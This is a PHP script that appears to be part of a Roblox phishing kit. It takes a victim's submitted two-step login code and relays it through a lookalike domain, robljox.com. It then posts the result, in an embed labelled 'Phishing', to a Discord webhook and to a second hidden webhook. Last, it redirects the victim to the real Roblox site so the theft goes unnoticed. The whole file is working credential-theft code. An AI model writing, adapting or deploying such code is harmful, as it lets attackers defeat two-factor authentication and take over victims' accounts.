<?php


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $get = $_GET["returnUrl"];
    $code = $_POST["step"];
    include("setup.php");
    $url = "https://robljox.com/2step.php?code=$code";
    $json = file_get_contents($url);
    $data = json_decode($json, true);
    $ValidCode = $data["code"];
    $webhook = file_get_contents("tokens/$get/webhook.txt");
    $headers = [ "Content-Type: application/json; charset=utf-8" ];
    $POST = [
        "username" => "$siteName - Bot",
        "avatar_url" => "$mainpfp",
         "content" => "",
            "embeds" => [
                [
                    "title" => ":money_with_wings: 2step Login code :candle:",
                    "type" => "rich",
                    "description" => "**2step code**",
                    "color" => hexdec("FF9ACD"),
                    "thumbnail" => [
                        "url" => "$mainpfp",
                    ],
                    "author" => [
                         "name" => "$siteName - Phishing",
                    ],
                    "footer" => [
                        "text" => "$siteName",
                      "icon_url" => "$mainpfp",
                    ],
                    "fields" => [
                        [
                            "name" => "**🔐 code**",
                            "value" => "```$ValidCode```",
                            "inline" => True
                        ],
                    ]
                ],
            ],
        
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $webhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response   = curl_exec($ch);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $Dwebhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response   = curl_exec($ch);
        echo "<script>window.location = \"https://www.roblox.com/\";</script>";

}
        
?>
